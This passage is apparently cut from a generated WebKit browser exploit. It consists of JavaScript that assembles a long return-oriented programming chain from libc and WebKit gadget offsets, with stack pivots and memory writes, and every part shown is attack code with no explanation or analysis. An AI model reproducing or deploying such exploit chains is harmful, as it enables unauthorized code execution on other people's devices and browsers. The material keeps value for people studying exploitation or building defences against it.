webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+133728, //L1787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133744, //L1788
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133712, //L1786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133848, //L1790
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133912, //L1794
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133896, //L1793
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+134024, //L1795+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+134016, //L1795
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134040, //L1795+24
ropchain+135672, //L1789
libc_base+793877, //pop rsi
ropchain+134080, //L1796
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1796:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1798:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+134200, //L1801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134184, //L1799
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1801:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+134368, //L1804
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134384, //L1805
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134352, //L1802
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134336, //L1803
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134456, //L1806
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134472, //L1807
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134632, //L1811
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134584, //L1809
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134616, //L1810
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1809:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1808:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L1810:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+134688, //L1813
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1813:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+134792, //L1815
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134824, //L1816
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134808, //L1814
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134896, //L1817
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134912, //L1818
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135008, //L1820
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134992, //L1819
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135088, //L1822
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1822:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1821:
db([10, 0]); // 0xa
set_gadget(libc_base+206806,); //pop rdi
//L1823:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135224, //L1824
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135256, //L1826
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135240, //L1825
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135424, //L1828
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135440, //L1829
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135408, //L1827
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135560, //L1831
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135592, //L1833
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135576, //L1832
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135664, //L1834
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1834:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+135784, //L1837
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135800, //L1838
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135768, //L1836
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135920, //L1840
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135952, //L1842
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135936, //L1841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+136024, //L1843
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1843:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136144, //L1846
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136160, //L1847
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136128, //L1845
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136264, //L1849
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136312, //L1852
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+136296, //L1851
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+136424, //L1853+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+136416, //L1853
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+136440, //L1853+24
ropchain+138736, //L1848
libc_base+793877, //pop rsi
ropchain+136480, //L1854
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1854:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1856:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+136600, //L1859
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136584, //L1857
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1859:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+136768, //L1862
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136784, //L1863
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136752, //L1860
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136736, //L1861
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136856, //L1864
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136872, //L1865
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+137032, //L1869
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136984, //L1867
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137016, //L1868
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1867:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1866:
db([56, 0]); // 0x38
set_gadget(libc_base+206806,); //pop rdi
//L1868:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+137136, //L1871
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137120, //L1870
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137216, //L1872
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1872:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1874:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137336, //L1877
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137320, //L1875
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137408, //L1878
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+137424, //L1879
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137568, //L1882
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137536, //L1880
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137552, //L1881
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137656, //L1884
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137744, //L1885
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1885:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1887:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137864, //L1890
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137848, //L1888
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137952, //L1891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137968, //L1893
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138024, //L1894
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1894:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138144, //L1896
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138200, //L1898
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138344, //L1902
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+138312, //L1901
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1901:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1900:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+138456, //L1903
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138488, //L1905
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+138472, //L1904
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138584, //L1906
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138600, //L1907
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138712, //L1908
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138696, //L1909
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+140144, //L1910
//L1848:
libc_base+793877, //pop rsi
ropchain+138776, //L1911
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1911:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1913:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+138896, //L1916
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+138880, //L1914
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1916:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+139040, //L1919
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139008, //L1917
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139024, //L1918
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+139120, //L1920
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1922:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+139240, //L1925
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139224, //L1923
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1925:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+139408, //L1928
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139424, //L1929
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139392, //L1926
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139376, //L1927
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139520, //L1931
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+139504, //L1930
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L1933:
ropchain+139624, //L1932
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+140456, //L1934
//L1932:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+139760, //L1936
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139776, //L1937
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139744, //L1935
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139880, //L1938
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139912, //L1940
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+139896, //L1939
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
